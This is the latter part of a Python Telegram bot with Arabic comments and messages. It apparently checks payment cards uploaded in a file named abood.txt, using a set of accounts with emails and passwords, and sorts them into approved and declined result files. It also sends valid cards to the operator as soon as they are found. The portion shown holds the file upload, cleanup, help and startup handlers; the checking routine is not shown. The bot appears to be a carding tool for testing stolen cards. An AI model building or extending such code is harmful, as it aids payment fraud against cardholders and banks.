                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="accounts_summary.txt",
                    caption="📁 ملخص الحسابات المستخدمة"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد حسابات بعد",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "cleanup":
        # تنظيف الملفات
        files_to_delete = ["APPROVED.txt", "declined.txt", "error.txt", "accounts_summary.txt", "abood.txt"]
        deleted = []
        
        for file in files_to_delete:
            if os.path.exists(file):
                os.remove(file)
                deleted.append(file)
        
        # تنظيف الملفات المؤقتة
        for temp_file in Path(TEMP_DIR).glob("*.txt"):
            temp_file.unlink()
            deleted.append(str(temp_file))
        
        # إعادة تعيين الإحصائيات
        stats = {
            'total': 0,
            'checked': 0,
            'approved': 0,
            'declined': 0,
            'errors': 0,
            'start_time': 0,
            'current_account': 0,
            'total_accounts': 0,
            'current_account_cards': 0,
            'total_account_cards': 0,
            'current_email': '',
            'current_password': ''
        }
        
        await query.edit_message_text(
            text=f"🧹 *تم تنظيف {len(deleted)} ملف/ملفات*",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
    
    elif query.data == "help":
        help_text = """
╔══════════════════════════════════╗
║     📚 *المساعدة*                ║
╠══════════════════════════════════╣
║ *الأزرار المتاحة:*               ║
║ ▶️ بدء الفحص - ابدأ الفحص        ║
║ ⏹️ إيقاف - أوقف الفحص مع تأكيد   ║
║ 📊 الحالة - عرض الإحصائيات       ║
║ 📁 النتائج - تحميل الملفات       ║
║ 🧹 تنظيف - حذف الملفات           ║
╠══════════════════════════════════╣
║ *مميزات العرض:*                  ║
║ • عرض تفصيلي لكل حساب            ║
║ • إحصائيات كل بطاقة              ║
║ • شريط تقدم بصري                 ║
║ • تحديث تلقائي كل دقيقة          ║
║ • إرسال فوري للبطاقات الصالحة    ║
╠══════════════════════════════════╣
║ *كيفية الاستخدام:*               ║
║ 1️⃣ أرسل ملف abood.txt           ║
║ 2️⃣ اضغط بدء الفحص                ║
║ 3️⃣ تابع التحديثات المباشرة      ║
║ 4️⃣ استلم النتائج فور ظهورها     ║
╚══════════════════════════════════╝"""
        
        await query.edit_message_text(
            text=help_text,
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
    
    elif query.data == "back_to_menu":
        await query.edit_message_text(
            text="🔍 *القائمة الرئيسية*\nاختر ما تريد فعله:",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """استقبال الملف"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # إرسال رسالة تأكيد
    await update.message.reply_text("📥 جاري استلام الملف...")
    
    try:
        # تحميل الملف
        file = await update.message.document.get_file()
        
        # التحقق من اسم الملف
        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text(
                "❌ الملف يجب أن يكون بصيغة .txt",
                reply_markup=get_control_keyboard()
            )
            return
        
        if update.message.document.file_name.lower() != "abood.txt":
            await update.message.reply_text(
                "❌ اسم الملف يجب أن يكون `abood.txt` بالضبط",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
            return
        
        # حفظ الملف
        temp_file_path = os.path.join(TEMP_DIR, f"abood_{user_id}_{int(time.time())}.txt")
        await file.download_to_drive(temp_file_path)
        
        # نسخ الملف
        shutil.copy2(temp_file_path, "abood.txt")
        
        # قراءة عدد البطاقات
        with open("abood.txt", "r", encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
        
        await update.message.reply_text(
            f"✅ *تم استلام الملف بنجاح!*\n📁 عدد البطاقات: {len(lines)}\n\nاضغط ▶️ *بدء الفحص* للبدء",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ حدث خطأ: {str(e)[:200]}",
            reply_markup=get_control_keyboard()
        )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض الحالة"""
    await send_status_update(update.effective_chat.id, context.bot)

async def cleanup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر التنظيف"""
    files_to_delete = ["APPROVED.txt", "declined.txt", "error.txt", "accounts_summary.txt", "abood.txt"]
    deleted = []
    
    for file in files_to_delete:
        if os.path.exists(file):
            os.remove(file)
            deleted.append(file)
    
    # تنظيف الملفات المؤقتة
    for temp_file in Path(TEMP_DIR).glob("*.txt"):
        temp_file.unlink()
        deleted.append(str(temp_file))
    
    # إعادة تعيين الإحصائيات
    global stats
    stats = {
        'total': 0,
        'checked': 0,
        'approved': 0,
        'declined': 0,
        'errors': 0,
        'start_time': 0,
        'current_account': 0,
        'total_accounts': 0,
        'current_account_cards': 0,
        'total_account_cards': 0,
        'current_email': '',
        'current_password': ''
    }
    
    await update.message.reply_text(
        f"🧹 *تم تنظيف {len(deleted)} ملف/ملفات*",
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المساعدة"""
    help_text = """
╔══════════════════════════════════╗
║     📚 *المساعدة*                ║
╠══════════════════════════════════╣
║ *الأزرار المتاحة:*               ║
║ ▶️ بدء الفحص - ابدأ الفحص        ║
║ ⏹️ إيقاف - أوقف الفحص مع تأكيد   ║
║ 📊 الحالة - عرض الإحصائيات       ║
║ 📁 النتائج - تحميل الملفات       ║
║ 🧹 تنظيف - حذف الملفات           ║
╠══════════════════════════════════╣
║ *الأوامر النصية:*                ║
║ /start - القائمة الرئيسية        ║
║ /status - عرض الحالة             ║
║ /cleanup - تنظيف الملفات         ║
║ /help - عرض المساعدة             ║
╚══════════════════════════════════╝"""
    
    await update.message.reply_text(
        help_text,
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

def main():
    """تشغيل البوت"""
    # تشغيل Flask server
    keep_alive()
    
    # إنشاء مجلد temp_files
    os.makedirs(TEMP_DIR, exist_ok=True)
    
    # إنشاء التطبيق
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة المعالجات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("cleanup", cleanup_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # تشغيل البوت
    print("🤖 البوت يعمل...")
    print("✨ ميزة الإرسال الفوري مفعلة")
    print("🎯 واجهة الأزرار جاهزة")
    print("📊 عرض الإحصائيات المتقدم مفعل")
    print("⏱️ التحديث التلقائي كل دقيقة مفعل")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
